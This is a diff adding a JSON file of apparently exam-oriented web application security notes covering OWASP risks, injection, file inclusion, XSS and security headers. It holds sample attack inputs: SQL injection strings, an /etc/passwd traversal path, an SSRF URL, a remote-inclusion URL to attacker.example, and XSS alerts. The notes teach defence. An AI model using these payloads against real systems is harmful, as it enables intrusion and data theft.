@@ -1,0 +1,2132 @@
+{
+  "id": "web-application-security",
+  "subject": "Security Concepts",
+  "title": "Web Application Security",
+  "topics": [
+    {
+      "id": "03-1-introduction-to-web-application-security",
+      "title": "1. Introduction to Web Application Security",
+      "definition": "Web application security is the process of protecting websites, web applications, APIs, databases, users, and backend systems from unauthorized access, data theft, manipulation, service disruption, and malicious code execution.",
+      "examPoints": [
+        "A web application generally consists of:",
+        "Client or browser",
+        "Web server",
+        "Application server",
+        "Database server",
+        "APIs",
+        "Authentication and session-management mechanisms",
+        "Third-party libraries and frameworks",
+        "A vulnerability in any of these components can compromise the entire application.",
+        "Main security objectives",
+        "# Session 1"
+      ],
+      "comparisons": [
+        "Objective: Meaning",
+        "Confidentiality: Data must be accessible only to authorized users",
+        "Integrity: Data must not be modified without authorization",
+        "Availability: Applications and services must remain accessible",
+        "Authentication: Verify the identity of a user",
+        "Authorization: Determine what an authenticated user can access",
+        "Accountability: Record and trace user and system actions",
+        "Non-repudiation: Prevent a user from denying an action performed"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "04-2-owasp-top-10-2021",
+      "title": "2. OWASP Top 10 – 2021",
+      "definition": "OWASP stands for the Open Worldwide Application Security Project. The OWASP Top 10 identifies major security risks affecting web applications.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "05-a01-broken-access-control",
+      "title": "A01: Broken Access Control",
+      "definition": "Broken access control occurs when an application fails to properly restrict what authenticated or unauthenticated users can access or modify.",
+      "examPoints": [
+        "Examples",
+        "A normal user accesses an administrator page.",
+        "A user changes user_id=101 to user_id=102 and sees another user's data.",
+        "A user modifies role=user to role=admin.",
+        "A user accesses restricted URLs directly.",
+        "Common forms",
+        "IDOR",
+        "Privilege escalation",
+        "Forced browsing",
+        "Missing authorization checks",
+        "Insecure CORS configuration",
+        "Mitigation",
+        "Perform server-side authorization checks.",
+        "Apply least privilege.",
+        "Deny access by default.",
+        "Use RBAC or ABAC.",
+        "Do not trust client-controlled parameters.",
+        "Log authorization failures."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "06-a02-cryptographic-failures",
+      "title": "A02: Cryptographic Failures",
+      "definition": "Cryptographic failures occur when sensitive data is exposed because encryption is missing, weak, incorrectly implemented, or poorly managed.",
+      "examPoints": [
+        "Examples",
+        "Sending passwords over HTTP",
+        "Storing passwords in plaintext",
+        "Using weak hashes such as MD5 or SHA-1",
+        "Hardcoding encryption keys",
+        "Accepting expired or invalid certificates",
+        "Mitigation",
+        "Use HTTPS with modern TLS.",
+        "Store passwords using password-hashing algorithms such as Argon2, bcrypt, scrypt, or PBKDF2.",
+        "Encrypt sensitive data at rest and in transit.",
+        "Protect cryptographic keys.",
+        "Disable weak algorithms and protocols."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "07-a03-injection",
+      "title": "A03: Injection",
+      "definition": "Injection occurs when untrusted input is interpreted as part of a command or query.",
+      "examPoints": [
+        "Types",
+        "SQL Injection",
+        "OS Command Injection",
+        "LDAP Injection",
+        "NoSQL Injection",
+        "XML Injection",
+        "XPath Injection",
+        "Server-Side Template Injection",
+        "Example",
+        "Malicious input:",
+        "The condition becomes true and may bypass authentication.",
+        "Mitigation",
+        "Use prepared statements.",
+        "Use parameterized queries.",
+        "Avoid string concatenation.",
+        "Validate input.",
+        "Apply least privilege to database accounts.",
+        "Hide detailed database errors."
+      ],
+      "comparisons": [],
+      "commands": [
+        "SELECT * FROM users",
+        "WHERE username = '$user'",
+        "AND password = '$pass';"
+      ],
+      "workflows": [
+        "' OR '1'='1' --"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "08-a04-insecure-design",
+      "title": "A04: Insecure Design",
+      "definition": "Insecure design refers to security weaknesses introduced during application architecture and design.",
+      "examPoints": [
+        "Examples",
+        "No account lockout",
+        "No rate limiting",
+        "Weak password-reset design",
+        "Missing authorization controls",
+        "Insecure business logic",
+        "No protection against automated abuse",
+        "Mitigation",
+        "Perform threat modelling.",
+        "Define security requirements early.",
+        "Use secure design patterns.",
+        "Review trust boundaries.",
+        "Apply defence in depth.",
+        "Test business logic."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "09-a05-security-misconfiguration",
+      "title": "A05: Security Misconfiguration",
+      "definition": "Security misconfiguration occurs when systems are deployed with insecure settings.",
+      "examPoints": [
+        "Examples",
+        "Default usernames and passwords",
+        "Directory listing enabled",
+        "Debug mode enabled in production",
+        "Unnecessary services running",
+        "Detailed error messages",
+        "Missing security headers",
+        "Unrestricted cloud storage",
+        "Mitigation",
+        "Harden servers and frameworks.",
+        "Remove unused services.",
+        "Change default credentials.",
+        "Disable debug mode.",
+        "Automate secure deployment.",
+        "Regularly review configurations."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "10-a06-vulnerable-and-outdated-components",
+      "title": "A06: Vulnerable and Outdated Components",
+      "definition": "Applications become vulnerable when they use unsupported or outdated libraries, frameworks, plugins, operating systems, or servers.",
+      "examPoints": [
+        "Examples",
+        "Old versions of Apache or PHP",
+        "Vulnerable JavaScript libraries",
+        "Unsupported databases",
+        "Unpatched frameworks",
+        "Mitigation",
+        "Maintain a software inventory.",
+        "Track component versions.",
+        "Apply patches.",
+        "Remove unused dependencies.",
+        "Use dependency scanning.",
+        "Review CVE and NVD records."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "11-a07-identification-and-authentication-failures",
+      "title": "A07: Identification and Authentication Failures",
+      "definition": "These failures allow attackers to compromise user accounts or sessions.",
+      "examPoints": [
+        "Examples",
+        "Weak passwords",
+        "No MFA",
+        "Unlimited login attempts",
+        "Predictable session IDs",
+        "Session IDs in URLs",
+        "Sessions remaining active after logout",
+        "Insecure password recovery",
+        "Mitigation",
+        "Implement MFA.",
+        "Use secure session management.",
+        "Regenerate session IDs after login.",
+        "Apply login throttling and lockout.",
+        "Use strong password policies.",
+        "Set secure cookie attributes."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "12-a08-software-and-data-integrity-failures",
+      "title": "A08: Software and Data Integrity Failures",
+      "definition": "These failures occur when software, updates, or data are trusted without integrity verification.",
+      "examPoints": [
+        "Examples",
+        "Installing unsigned software",
+        "Insecure CI/CD pipelines",
+        "Unverified application updates",
+        "Unsafe deserialization",
+        "Loading code from untrusted sources",
+        "Mitigation",
+        "Verify digital signatures.",
+        "Use trusted repositories.",
+        "Secure CI/CD pipelines.",
+        "Protect source-code repositories.",
+        "Validate software updates.",
+        "Use cryptographic hashes."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "13-a09-security-logging-and-monitoring-failures",
+      "title": "A09: Security Logging and Monitoring Failures",
+      "definition": "An organization may fail to detect or respond to attacks if important security events are not logged or monitored.",
+      "examPoints": [
+        "Examples",
+        "Failed logins are not logged.",
+        "Administrative actions are not recorded.",
+        "Logs are stored insecurely.",
+        "No alerts are generated for suspicious activity.",
+        "Logs are never reviewed.",
+        "Mitigation",
+        "Centralize logs.",
+        "Record authentication and authorization failures.",
+        "Protect logs from modification.",
+        "Synchronize system clocks.",
+        "Configure alerts.",
+        "Establish incident-response procedures."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "14-a10-server-side-request-forgery",
+      "title": "A10: Server-Side Request Forgery",
+      "definition": "SSRF occurs when an application fetches a URL supplied by a user without proper validation.",
+      "examPoints": [
+        "Example",
+        "The vulnerable server sends the request to an internal service.",
+        "Impact",
+        "Access to internal systems",
+        "Cloud metadata theft",
+        "Internal port scanning",
+        "Credential exposure",
+        "Possible remote code execution",
+        "Mitigation",
+        "Allowlist trusted destinations.",
+        "Block private and loopback addresses.",
+        "Restrict outbound server traffic.",
+        "Validate URLs and redirects.",
+        "Segment internal networks."
+      ],
+      "comparisons": [],
+      "commands": [
+        "https://example.com/fetch?url=http://127.0.0.1/admin"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "15-3-injection-vulnerabilities",
+      "title": "3. Injection Vulnerabilities",
+      "definition": "Injection vulnerabilities occur when an application sends untrusted data to an interpreter.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "16-sql-injection",
+      "title": "SQL Injection",
+      "definition": "SQL Injection manipulates database queries through malicious input.",
+      "examPoints": [
+        "Authentication bypass",
+        "Union-based SQL Injection",
+        "Uses the UNION operator to combine query results.",
+        "Error-based SQL Injection",
+        "The attacker causes database errors that reveal information such as:",
+        "Database type",
+        "Table names",
+        "Column names",
+        "Query structure",
+        "Boolean-based Blind SQL Injection",
+        "The application does not display database data, but the attacker infers information from different responses.",
+        "Time-based Blind SQL Injection",
+        "The attacker infers results using response delays.",
+        "Mitigation",
+        "Parameterized queries",
+        "Prepared statements",
+        "ORM frameworks",
+        "Input validation",
+        "Least-privileged database accounts",
+        "Generic error messages",
+        "Web application firewall as an additional control"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "' OR '1'='1' --",
+        "' UNION SELECT username,password FROM users --",
+        "' AND 1=1 --",
+        "' AND 1=2 --",
+        "' OR IF(1=1,SLEEP(5),0) --"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "17-command-injection",
+      "title": "Command Injection",
+      "definition": "Command injection occurs when user input is passed to an operating-system shell.",
+      "examPoints": [
+        "Example vulnerable logic:",
+        "Malicious input may append another operating-system command.",
+        "Mitigation",
+        "Avoid shell commands where possible.",
+        "Use secure APIs.",
+        "Allowlist input.",
+        "Escape arguments correctly.",
+        "Run services with minimum privileges."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "ping <user-input>"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "18-ldap-injection",
+      "title": "LDAP Injection",
+      "definition": "LDAP injection manipulates LDAP filters used for directory authentication or searches.",
+      "examPoints": [
+        "Mitigation",
+        "Escape LDAP special characters.",
+        "Use parameterized LDAP APIs.",
+        "Validate usernames and attributes.",
+        "Apply least privilege."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "19-nosql-injection",
+      "title": "NoSQL Injection",
+      "definition": "NoSQL injection targets databases such as MongoDB.",
+      "examPoints": [
+        "Example malicious condition:",
+        "This may cause a query to match more records than intended.",
+        "Mitigation",
+        "Validate data types.",
+        "Reject query operators from user input.",
+        "Use secure database drivers.",
+        "Avoid directly using client-supplied JSON in queries."
+      ],
+      "comparisons": [],
+      "commands": [
+        "{\"$gt\": \"\"}"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "20-4-inclusion-vulnerabilities",
+      "title": "4. Inclusion Vulnerabilities",
+      "definition": "Inclusion vulnerabilities occur when user input controls which file an application loads.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "21-local-file-inclusion",
+      "title": "Local File Inclusion",
+      "definition": "LFI loads files from the local server.",
+      "examPoints": [
+        "Example:",
+        "Impact",
+        "Sensitive-file disclosure",
+        "Configuration-file exposure",
+        "Source-code disclosure",
+        "Log poisoning",
+        "Possible code execution"
+      ],
+      "comparisons": [],
+      "commands": [
+        "page.php?file=../../../../etc/passwd"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "22-remote-file-inclusion",
+      "title": "Remote File Inclusion",
+      "definition": "RFI loads a file from a remote server.",
+      "examPoints": [
+        "Example:",
+        "Impact",
+        "Remote code execution",
+        "Malware installation",
+        "Server compromise",
+        "Mitigation for LFI and RFI",
+        "Do not accept arbitrary file paths.",
+        "Use an allowlist of approved files.",
+        "Use fixed absolute paths.",
+        "Reject directory traversal sequences.",
+        "Disable remote file inclusion.",
+        "Apply minimum file permissions."
+      ],
+      "comparisons": [],
+      "commands": [
+        "page.php?file=https://attacker.example/malicious.php"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "23-5-cross-site-scripting",
+      "title": "5. Cross-Site Scripting",
+      "definition": "XSS occurs when attacker-controlled script executes in another user's browser under the context of a trusted website.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "24-stored-xss",
+      "title": "Stored XSS",
+      "definition": "The malicious script is permanently stored on the server.",
+      "examPoints": [
+        "Example locations",
+        "Comments",
+        "User profiles",
+        "Message boards",
+        "Product reviews",
+        "Example:",
+        "Every user who views the affected page may execute the script."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "<script>alert('XSS')</script>"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "25-reflected-xss",
+      "title": "Reflected XSS",
+      "definition": "The malicious input is immediately returned in the server's response.",
+      "examPoints": [
+        "Example:",
+        "The victim normally needs to click a crafted link."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "/search?q=<script>alert(1)</script>"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "26-dom-based-xss",
+      "title": "DOM-Based XSS",
+      "definition": "The vulnerability exists in client-side JavaScript. The server may not process the malicious input.",
+      "examPoints": [
+        "Dangerous APIs include:",
+        "Safer APIs include:"
+      ],
+      "comparisons": [],
+      "commands": [
+        "innerHTML",
+        "document.write()",
+        "eval()",
+        "textContent",
+        "createTextNode()"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "27-impact-of-xss",
+      "title": "Impact of XSS",
+      "definition": "",
+      "examPoints": [
+        "Session theft",
+        "Credential theft",
+        "Page defacement",
+        "Keylogging",
+        "Malicious redirection",
+        "Actions performed as the victim",
+        "Browser-based malware delivery"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "28-xss-mitigation",
+      "title": "XSS Mitigation",
+      "definition": "HttpOnly helps prevent JavaScript from reading a cookie.",
+      "examPoints": [
+        "Context-sensitive output encoding",
+        "Input validation",
+        "HTML sanitization",
+        "Content Security Policy",
+        "Secure cookie attributes",
+        "Avoid dangerous DOM APIs",
+        "Use trusted frameworks with auto-escaping",
+        "Important cookie attributes"
+      ],
+      "comparisons": [],
+      "commands": [
+        "HttpOnly",
+        "Secure",
+        "SameSite"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "29-6-injection-in-stored-procedures",
+      "title": "6. Injection in Stored Procedures",
+      "definition": "Stored procedures are not automatically safe from SQL Injection.",
+      "examPoints": [
+        "They become vulnerable when they dynamically construct SQL statements using string concatenation."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "30-vulnerable-stored-procedure",
+      "title": "Vulnerable stored procedure",
+      "definition": "The procedure remains vulnerable because user input becomes part of the SQL command.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "CREATE PROCEDURE GetUser",
+        "@username VARCHAR(100)",
+        "AS",
+        "BEGIN",
+        "DECLARE @query VARCHAR(500);",
+        "SET @query =",
+        "'SELECT * FROM users WHERE username = '''",
+        "+ @username + '''';",
+        "EXEC(@query);",
+        "END;"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "31-secure-stored-procedure",
+      "title": "Secure stored procedure",
+      "definition": "# Session 2",
+      "examPoints": [
+        "Mitigation",
+        "Use strongly typed parameters.",
+        "Avoid dynamic SQL.",
+        "Use sp_executesql with parameters when dynamic SQL is unavoidable.",
+        "Apply input validation.",
+        "Limit database privileges.",
+        "Hide detailed database errors."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "CREATE PROCEDURE GetUser",
+        "@username VARCHAR(100)",
+        "AS",
+        "BEGIN",
+        "SELECT *",
+        "FROM users",
+        "WHERE username = @username;",
+        "END;"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "32-7-denial-of-service",
+      "title": "7. Denial of Service",
+      "definition": "A DoS attack attempts to make a system or service unavailable to legitimate users.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "33-dos-vs-ddos",
+      "title": "DoS vs DDoS",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "DoS: DDoS",
+        "Usually originates from one source: Originates from multiple systems",
+        "Easier to identify and block: More difficult to block",
+        "Limited attack capacity: Uses distributed attack capacity",
+        "May use a single attacking machine: Commonly uses a botnet"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "34-types-of-dos-attacks",
+      "title": "Types of DoS attacks",
+      "definition": "The attacker overwhelms network bandwidth.",
+      "examPoints": [
+        "Traffic flooding",
+        "Resource exhaustion",
+        "The attacker consumes:",
+        "CPU",
+        "Memory",
+        "Threads",
+        "Database connections",
+        "File descriptors",
+        "Application-layer DoS",
+        "The attacker sends expensive application requests.",
+        "Examples:",
+        "Repeated search requests",
+        "Repeated login attempts",
+        "Large report generation",
+        "Expensive database queries",
+        "Protocol-based attacks",
+        "SYN flood",
+        "Smurf attack",
+        "Fragmentation attacks"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "35-dos-impact",
+      "title": "DoS Impact",
+      "definition": "",
+      "examPoints": [
+        "Service downtime",
+        "Revenue loss",
+        "Reputation damage",
+        "Resource exhaustion",
+        "SLA violations",
+        "Distraction from another attack"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "36-mitigation",
+      "title": "Mitigation",
+      "definition": "All DoS testing must be performed only in an authorized laboratory environment.",
+      "examPoints": [
+        "Rate limiting",
+        "Traffic filtering",
+        "Load balancing",
+        "CDN and DDoS-protection services",
+        "IPS and firewalls",
+        "Redundancy and failover",
+        "Connection limits",
+        "Application caching",
+        "Resource quotas"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "37-8-buffer-overflow",
+      "title": "8. Buffer Overflow",
+      "definition": "A buffer overflow occurs when a program writes more data into a memory buffer than the buffer can hold.",
+      "examPoints": [
+        "Example:",
+        "gets() does not check input length."
+      ],
+      "comparisons": [],
+      "commands": [
+        "char buffer[10];",
+        "gets(buffer);"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "38-possible-impact",
+      "title": "Possible impact",
+      "definition": "",
+      "examPoints": [
+        "Application crash",
+        "Memory corruption",
+        "Arbitrary code execution",
+        "Privilege escalation",
+        "Denial of service"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "39-mitigation",
+      "title": "Mitigation",
+      "definition": "",
+      "examPoints": [
+        "Bounds checking",
+        "Safe functions",
+        "Stack canaries",
+        "Address Space Layout Randomization",
+        "Data Execution Prevention",
+        "Compiler security options",
+        "Memory-safe programming languages",
+        "Input-length restrictions"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "40-9-input-validation",
+      "title": "9. Input Validation",
+      "definition": "Input validation ensures that supplied data matches expected type, format, size, range, and structure.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "41-types-of-validation",
+      "title": "Types of validation",
+      "definition": "Accept only known valid input.",
+      "examPoints": [
+        "Allowlist validation",
+        "Example:",
+        "Type validation",
+        "Ensure that a numeric field receives a number.",
+        "Length validation",
+        "Restrict maximum and minimum length.",
+        "Range validation",
+        "Ensure a value falls within a permitted range.",
+        "Format validation",
+        "Examples:",
+        "Email format",
+        "Date format",
+        "Phone-number format",
+        "Business-rule validation",
+        "Ensure the input is logically permitted.",
+        "A withdrawal amount must not exceed the account balance."
+      ],
+      "comparisons": [],
+      "commands": [
+        "Username: letters and numbers only"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "42-client-side-vs-server-side-validation",
+      "title": "Client-side vs server-side validation",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "Client-side validation: Server-side validation",
+        "Runs in the browser: Runs on the server",
+        "Improves user experience: Enforces security",
+        "Can be modified or bypassed: Cannot be directly bypassed by changing browser code",
+        "Must not be trusted alone: Mandatory"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "43-validation-vs-sanitization-vs-encoding",
+      "title": "Validation vs sanitization vs encoding",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "Technique: Purpose",
+        "Validation: Confirms that input is acceptable",
+        "Sanitization: Removes or neutralizes unwanted content",
+        "Encoding: Converts special characters so they are treated as data",
+        "Parameterization: Separates commands from user-controlled data"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "44-10-access-control",
+      "title": "10. Access Control",
+      "definition": "Access control determines who can access a resource and what actions they may perform.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "45-authentication-vs-authorization",
+      "title": "Authentication vs authorization",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "Authentication: Authorization",
+        "Verifies identity: Determines permissions",
+        "“Who are you?”: “What are you allowed to do?”",
+        "Happens before authorization: Happens after authentication"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "46-access-control-models",
+      "title": "Access-control models",
+      "definition": "The resource owner decides permissions.",
+      "examPoints": [
+        "Discretionary Access Control",
+        "Example: Traditional Unix file permissions.",
+        "Mandatory Access Control",
+        "A central policy controls access based on security labels.",
+        "Example: SELinux.",
+        "Role-Based Access Control",
+        "Permissions are assigned to roles.",
+        "Example:",
+        "Administrator",
+        "Manager",
+        "Employee",
+        "Customer",
+        "Attribute-Based Access Control",
+        "Access depends on attributes such as:",
+        "User role",
+        "Device",
+        "Time",
+        "Location",
+        "Department",
+        "Resource sensitivity"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "47-access-control-principles",
+      "title": "Access-control principles",
+      "definition": "# Session 3",
+      "examPoints": [
+        "Least privilege",
+        "Need to know",
+        "Separation of duties",
+        "Deny by default",
+        "Server-side enforcement",
+        "Regular permission review",
+        "Accountability and logging"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "48-11-web-application-security-risks",
+      "title": "11. Web Application Security Risks",
+      "definition": "Common risks include:",
+      "examPoints": [
+        "Injection",
+        "XSS",
+        "CSRF",
+        "Broken authentication",
+        "Broken access control",
+        "Cryptographic failures",
+        "Security misconfiguration",
+        "Vulnerable components",
+        "Insecure file upload",
+        "Insecure APIs",
+        "Session-management weaknesses",
+        "Insufficient logging",
+        "SSRF",
+        "Business-logic abuse"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "49-identifying-application-security-risks",
+      "title": "Identifying application-security risks",
+      "definition": "",
+      "examPoints": [
+        "Manual methods",
+        "Architecture review",
+        "Code review",
+        "Threat modelling",
+        "Manual penetration testing",
+        "Business-logic testing",
+        "Configuration review",
+        "Automated methods",
+        "SAST",
+        "DAST",
+        "Dependency scanning",
+        "Vulnerability scanning",
+        "Container scanning",
+        "Secret scanning"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "50-12-threat-risk-modelling",
+      "title": "12. Threat Risk Modelling",
+      "definition": "Threat modelling is a structured process for identifying assets, threats, vulnerabilities, attack paths, and security controls.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "51-threat-modelling-process",
+      "title": "Threat-modelling process",
+      "definition": "",
+      "examPoints": [
+        "Identify assets.",
+        "Identify entry points.",
+        "Identify trust boundaries.",
+        "Identify threat actors.",
+        "Identify threats.",
+        "Identify vulnerabilities.",
+        "Assess likelihood.",
+        "Assess impact.",
+        "Prioritize risks.",
+        "Define mitigations.",
+        "Reassess after controls are implemented."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "52-risk-calculation",
+      "title": "Risk calculation",
+      "definition": "A common simplified model is:",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [
+        "Risk = Likelihood × Impact"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "53-stride-model",
+      "title": "STRIDE model",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "Letter: Threat",
+        "S: Spoofing",
+        "T: Tampering",
+        "R: Repudiation",
+        "I: Information Disclosure",
+        "D: Denial of Service",
+        "E: Elevation of Privilege"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "55-authorization",
+      "title": "Authorization",
+      "definition": "Carries authentication credentials or tokens.",
+      "examPoints": [
+        "Sensitive authorization headers must not be logged carelessly."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "Authorization: Bearer <token>"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "56-host",
+      "title": "Host",
+      "definition": "Identifies the requested hostname.",
+      "examPoints": [
+        "Improper Host-header handling may lead to:",
+        "Password-reset poisoning",
+        "Cache poisoning",
+        "Incorrect routing"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "57-referer",
+      "title": "Referer",
+      "definition": "Indicates the page that initiated a request.",
+      "examPoints": [
+        "It may leak sensitive data if confidential information appears in URLs."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "58-origin",
+      "title": "Origin",
+      "definition": "Identifies the origin of a cross-origin request.",
+      "examPoints": [
+        "Used in CORS and CSRF-related security checks."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "59-content-type",
+      "title": "Content-Type",
+      "definition": "Specifies the request or response media type.",
+      "examPoints": [
+        "Example:",
+        "Improper content-type handling may contribute to parser confusion."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "Content-Type: application/json"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "60-content-security-policy",
+      "title": "Content-Security-Policy",
+      "definition": "Restricts the sources from which scripts and other resources may load.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "Content-Security-Policy: default-src 'self'"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "61-x-frame-options",
+      "title": "X-Frame-Options",
+      "definition": "Helps prevent clickjacking.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "X-Frame-Options: DENY"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "62-strict-transport-security",
+      "title": "Strict-Transport-Security",
+      "definition": "Forces browsers to use HTTPS.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "Strict-Transport-Security: max-age=31536000; includeSubDomains"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "63-set-cookie",
+      "title": "Set-Cookie",
+      "definition": "Creates or updates cookies.",
+      "examPoints": [
+        "Secure example:"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "Set-Cookie: session=abc;",
+        "Secure;",
+        "HttpOnly;",
+        "SameSite=Strict"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "64-cache-control",
+      "title": "Cache-Control",
+      "definition": "Prevents caching of sensitive content.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "Cache-Control: no-store"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "65-x-content-type-options",
+      "title": "X-Content-Type-Options",
+      "definition": "Prevents MIME-type sniffing.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "X-Content-Type-Options: nosniff"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "66-14-burp-suite",
+      "title": "14. Burp Suite",
+      "definition": "Burp Suite is an integrated web-application security testing platform.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "67-proxy",
+      "title": "Proxy",
+      "definition": "Intercepts browser requests and server responses.",
+      "examPoints": [
+        "Uses:",
+        "Inspect requests",
+        "Modify parameters",
+        "Test cookies",
+        "Manipulate headers",
+        "Examine server responses"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "68-repeater",
+      "title": "Repeater",
+      "definition": "Used to manually modify and resend individual requests.",
+      "examPoints": [
+        "Best suited for:",
+        "SQL Injection testing",
+        "XSS testing",
+        "Authorization testing",
+        "Parameter manipulation",
+        "Comparing server behaviour"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
